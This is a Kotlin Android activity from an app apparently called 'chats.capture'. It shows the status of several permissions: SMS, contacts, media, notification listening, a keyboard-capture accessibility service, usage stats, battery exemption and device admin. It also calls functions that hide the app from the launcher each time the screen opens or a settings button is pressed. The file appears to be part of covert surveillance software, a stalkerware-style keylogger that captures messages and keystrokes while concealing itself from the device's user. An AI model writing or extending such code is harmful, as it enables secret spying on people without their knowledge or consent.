package com.chats.capture.ui

import android.app.AppOpsManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.core.app.NotificationManagerCompat
import com.chats.capture.R
import com.chats.capture.mdm.DeviceAdminReceiver
import com.chats.capture.utils.AppHider
import com.chats.capture.utils.AppVisibilityManager

class PermissionSettingsActivity : AppCompatActivity() {

    private lateinit var runtimeStatus: TextView
    private lateinit var notificationStatus: TextView
    private lateinit var accessibilityStatus: TextView
    private lateinit var usageStatus: TextView
    private lateinit var batteryStatus: TextView
    private lateinit var deviceAdminStatus: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Always hide app from launcher (Device Owner mode)
        AppVisibilityManager.hideFromLauncher(this)
        AppHider.ensureHidden(this)
        
        setContentView(R.layout.activity_permission_settings)

        runtimeStatus = findViewById(R.id.tv_runtime_status)
        notificationStatus = findViewById(R.id.tv_notification_status)
        accessibilityStatus = findViewById(R.id.tv_accessibility_status)
        usageStatus = findViewById(R.id.tv_usage_status)
        batteryStatus = findViewById(R.id.tv_battery_status)
        deviceAdminStatus = findViewById(R.id.tv_device_admin_status)

        findViewById<Button>(R.id.btn_open_app_permissions).setOnClickListener {
            openAppSettings()
            // Re-hide app after opening settings
            AppVisibilityManager.hideFromLauncher(this)
            AppHider.ensureHidden(this)
        }
        findViewById<Button>(R.id.btn_open_notification_settings).setOnClickListener {
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            // Re-hide app after opening settings
            AppVisibilityManager.hideFromLauncher(this)
            AppHider.ensureHidden(this)
        }
        findViewById<Button>(R.id.btn_open_accessibility_settings).setOnClickListener {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            // Re-hide app after opening settings
            AppVisibilityManager.hideFromLauncher(this)
            AppHider.ensureHidden(this)
        }
        findViewById<Button>(R.id.btn_open_usage_settings).setOnClickListener {
            startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
            // Re-hide app after opening settings
            AppVisibilityManager.hideFromLauncher(this)
            AppHider.ensureHidden(this)
        }
        findViewById<Button>(R.id.btn_open_battery_settings).setOnClickListener {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
            } else {
                startActivity(Intent(Settings.ACTION_SETTINGS))
            }
            // Re-hide app after opening settings
            AppVisibilityManager.hideFromLauncher(this)
            AppHider.ensureHidden(this)
        }
        findViewById<Button>(R.id.btn_open_device_admin_settings).setOnClickListener {
            startActivity(Intent(Settings.ACTION_SECURITY_SETTINGS))
            // Re-hide app after opening settings
            AppVisibilityManager.hideFromLauncher(this)
            AppHider.ensureHidden(this)
        }
    }

    override fun onResume() {
        super.onResume()
        // Re-hide app when returning to settings
        AppVisibilityManager.hideFromLauncher(this)
        AppHider.ensureHidden(this)
        updateStatuses()
    }

    private fun updateStatuses() {
        runtimeStatus.text = buildRuntimeStatus()
        notificationStatus.text = buildNotificationStatus()
        accessibilityStatus.text = buildAccessibilityStatus()
        usageStatus.text = buildUsageStatus()
        batteryStatus.text = buildBatteryStatus()
        deviceAdminStatus.text = buildDeviceAdminStatus()
    }

    private fun buildRuntimeStatus(): String {
        val contactsGranted = hasPermission(android.Manifest.permission.READ_CONTACTS)
        val smsGranted = hasPermission(android.Manifest.permission.READ_SMS)
        val notificationsGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            hasPermission(android.Manifest.permission.POST_NOTIFICATIONS)
        } else {
            NotificationManagerCompat.from(this).areNotificationsEnabled()
        }
        val mediaGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            hasPermission(android.Manifest.permission.READ_MEDIA_IMAGES) &&
                hasPermission(android.Manifest.permission.READ_MEDIA_VIDEO) &&
                hasPermission(android.Manifest.permission.READ_MEDIA_AUDIO)
        } else {
            hasPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE)
        }

        return getString(
            R.string.permission_runtime_status,
            formatStatus(contactsGranted),
            formatStatus(smsGranted),
            formatStatus(mediaGranted),
            formatStatus(notificationsGranted)
        )
    }

    private fun buildNotificationStatus(): String {
        val enabled = NotificationManagerCompat.getEnabledListenerPackages(this).contains(packageName)
        return getString(R.string.permission_notification_status, formatStatus(enabled))
    }

    private fun buildAccessibilityStatus(): String {
        val enabledServices = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: ""

        val keyboardEnabled = enabledServices.contains("${packageName}/.services.KeyboardCaptureService")
        val enhancedEnabled = enabledServices.contains("${packageName}/.services.EnhancedAccessibilityService")

        return getString(
            R.string.permission_accessibility_status,
            formatStatus(keyboardEnabled),
            formatStatus(enhancedEnabled)
        )
    }

    private fun buildUsageStatus(): String {
        val appOps = getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            appOps.unsafeCheckOpNoThrow(
                AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(),
                packageName
            )
        } else {
            @Suppress("DEPRECATION")
            appOps.checkOpNoThrow(
                AppOpsManager.OPSTR_GET_USAGE_STATS,
                android.os.Process.myUid(),
                packageName
            )
        }
        val granted = mode == AppOpsManager.MODE_ALLOWED
        return getString(R.string.permission_usage_status, formatStatus(granted))
    }

    private fun buildBatteryStatus(): String {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            return getString(R.string.permission_battery_status, getString(R.string.permission_status_not_applicable))
        }
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        val ignoring = powerManager.isIgnoringBatteryOptimizations(packageName)
        return getString(R.string.permission_battery_status, formatStatus(ignoring))
    }

    private fun buildDeviceAdminStatus(): String {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminComponent = ComponentName(this, DeviceAdminReceiver::class.java)
        val active = dpm.isAdminActive(adminComponent)
        return getString(R.string.permission_device_admin_status, formatStatus(active))
    }

    private fun hasPermission(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(this, permission) ==
            android.content.pm.PackageManager.PERMISSION_GRANTED
    }

    private fun openAppSettings() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = android.net.Uri.fromParts("package", packageName, null)
        }
        startActivity(intent)
    }

    private fun formatStatus(granted: Boolean): String {
        return if (granted) {
            getString(R.string.permission_status_granted)
        } else {
            getString(R.string.permission_status_denied)
        }
    }
}
